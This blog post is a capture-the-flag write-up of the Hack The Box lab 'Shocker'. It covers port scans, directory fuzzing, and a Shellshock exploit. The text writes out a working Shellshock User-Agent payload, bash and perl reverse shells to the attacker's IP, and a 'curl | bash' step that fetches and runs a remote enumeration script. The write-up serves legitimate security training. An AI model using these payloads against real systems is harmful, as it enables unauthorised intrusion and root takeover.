---
layout: post
title: HTB Shocker
modified: 2021-05-31
categories: [Hack The Box]
---

<style>
img {
  width: 95%;
  height: 95%;
}
</style>


# HackTheBox | Shocker

## Initial TCP Nmap Scan

```
Nmap scan report for 10.10.10.56
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.92 seconds
```

## Full TCP Nmap Scan

```
Nmap scan report for 10.10.10.56
Host is up (0.078s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.47 seconds
```

## Initial Thoughts Based On Nmap Scan

Looking at the port scans it is pretty similar to how a lot of HackTheBox boxes are: HTTP and SSH. Personally for me, I never really try to dig too deep into SSH until I have some sort of credentials so we will see if we can find any by enumerating HTTP. Speaking of HTTP, I am going to be seeing if I can find any sort of service version and see if I can find a known proof-of-concept to exploit the service, run a `Gobuster` scan to do directory brute-forcing and see if I can find any interesting directories, etc. With that being said, let's jump into enumerating HTTP first.

## 80 - HTTP | Enumeration

Navigating to `10.10.10.56` we get the following page:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/shocker/image-20210606214951168.png" />
</p>

Just a simple web page that says "Don't Bug Me!". Checking the source code and just looking around I don't find anything of interest. Before I keep digging around, I am going to run a `Gobuster` scan to see if I can find any interesting directories. Running Gobuster and using the `dirbuster/directory-list-2.3-medium.txt` did not really give me anything interesting. I decided to go and run another wordlist against the host and used SecLists' `big.txt` file under `/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`. 

```
root@kali-[~]gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 11:20:22 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/server-status        (Status: 403) [Size: 299]

```

And I see something very interesting which is `/cgi-bin/`. If you are wondering why this looks interesting, typically when I see anything relating to `cgi` I instantly think of the `Shellshock exploit`. Essentially you can add the following string into HTTP headers and gain arbitrary code execution: `() { :;};`. If you want to read more about `Shellshock`, I would highly suggest you look into [The ShellShock Attack](https://www.exploit-db.com/docs/48112) by Nayan Das, or a [Cloudflare blog](https://blog.cloudflare.com/inside-shellshock/) going into more detail about how and why this exploit works. With that being said, let's continue with how to exploit this box. So we already found the `/cgi-bin/` directory which is great, but we need to enumerate this directory more by looking for file extensions such as `.sh` or `.cgi` which are somewhat common to see when you have `/cgi-bin/`. For this I am going to use `ffuf` which is a fast web fuzzer written in Go. We could use `Gobuster` to do directory discovering, but I just wanted to introduce a new tool that I have not yet used in this blog yet. It is pretty similar to `Gobuster` but just has a few syntax differences. To use `ffuf` against the `/cgi-bin/` directory, we simply use the following structure:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content-big.txt -u http://10.10.10.56/cgi-bin/FUZZ -e .sh,.cgi
```

The `FUZZ` at the end of the URL specifies where you want to wordlist to be put into essentially. The `-w` specifies the path to a wordlist, `-u` is the flag for target URL, and -e is for extensions separated by commas. Running `ffuf` we get the following output:

```
root@kali-[~]ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.56/cgi-bin/FUZZ -e .sh,.cgi

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .sh .cgi 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 303, Words: 22, Lines: 12]
.htaccess.sh            [Status: 403, Size: 306, Words: 22, Lines: 12]
.htpasswd.cgi           [Status: 403, Size: 307, Words: 22, Lines: 12]
.htpasswd.sh            [Status: 403, Size: 306, Words: 22, Lines: 12]
.htaccess.cgi           [Status: 403, Size: 307, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 303, Words: 22, Lines: 12]
user.sh                 [Status: 200, Size: 119, Words: 19, Lines: 8]
:: Progress: [61425/61425] :: Job [1/1] :: 512 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
```

We can see a `user.sh`. Downloading the `user.sh` file shows the following:

```
root@kali-[~/Downloads]cat user.sh 
Content-Type: text/plain

Just an uptime test script

 14:56:41 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
```

It simply is a script that shows the uptime of the system.

We could also view this response in `Burp Suite` by using `GET /cgi-bin/user.sh` for the GET request.

<p align="center">
  <img src="{{ site.github.url }}/images/htb/shocker/image-20210614115510696.png" />
</p>

Now all we need to do is simply change the `User-Agent` HTTP Header by having the Shellshock payload instead of Mozilla/5.0..... So `User-Agent` should look something like this: 

```
User-Agent: () { :;};[CMD]
```

[CMD] is where you are going to put your command you want to run on the host. Looking at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for `Bash TCP reverse shells,` we are going to use `/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1` where you are going to change `10.0.0.1` to your IP address. So now my `User-Agent` HTTP header looks like the following:

```
User-Agent: () { :;};/bin/bash -l > /dev/tcp/10.10.14.36/4242 0<&1 2>&1
```

Before you send this request, have a Netcat listener running on port 4242. 

```
nc -lvnp 4242
```

Something to keep in mind is that you can send this request through `Burp Suite` (probably the easiest way in my opinion), or you can use things like `curl` too. For `Burp Suite`, just change the `User-Agent` HTTP header to what was shown before, if you are using curl you could use the following command:

```
curl -A "() { :;};/bin/bash -l > /dev/tcp/10.10.14.36/4242 0<&1 2>&1" http://10.10.10.56/cgi-bin/user.sh
```

The `-A` flag specifies what you want to input for the `User-Agent` HTTP header. After running this command, we can see we got a connection from `10.10.10.56` and have a low privilege shell as the user shelly.

```
root@kali-[~]nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.56] 42914
whoami && id
shelly
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

## Privilege Escalation

For privilege escalation, it is always important to go and run some sort of enumeration tool such as `LinEnum` or `linpeas`. These tools will enumerate for misconfigurations, exploits, interesting config files, etc. 

Personally, I am going to use `LinEnum`. If you do not already have `LinEnum` or `linpeas` they can be cloned running:

```
git clone https://github.com/rebootuser/LinEnum.git
```

Or you can run this to get linpeas:

```
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
```

After you have cloned one of these tools, simply navigate to the directory where the file is (for me it is `/opt/privilege-escalation-awesome-scripts-suite/linPEAS`) and host a simple HTTP server using Python.

```
python -m SimpleHTTPServer 80
```

Now the awesome thing about just having a simple HTTP server is that on the compromised host we have a shell on, we can use `curl` to pipe the `LinEnum.sh` file to `bash` and it just runs on the compromised host without having to download the file onto the host which is amazing. On the compromised host I ran the following command:

```
curl http://10.10.14.36/LinEnum.sh | bash
```

Scrolling down the output of `LinEnum` I see something interesting:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl


[+] Possible sudo pwnage!
/usr/bin/perl
```

We can run `perl` under the path `/usr/bin/perl` as `sudo` with no password. This should be an easy pwn. Using [PayloadsAllTheThings' Reverse Shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl) there is a section on how to get a reverse shell using `perl`. All we need to do is change the IP address on the command, set up a Netcat listener on port 4242 on our host, and run the perl command on the compromised host and we should get root!

```
nc -lvnp 4242
```

After setting up a Netcat listener on our host, I ran the following command on the compromised host:

```
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.36";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Looking back at my Netcat listener we got a connection back!

```
root@kali-[~]nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.56] 42940
/bin/sh: 0: can't access tty; job control turned off
# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

Overall was a pretty nice box. I always tend to enjoy the boxes that deviate away from an easy pwn using Metasploit so it was fun pwning this box.
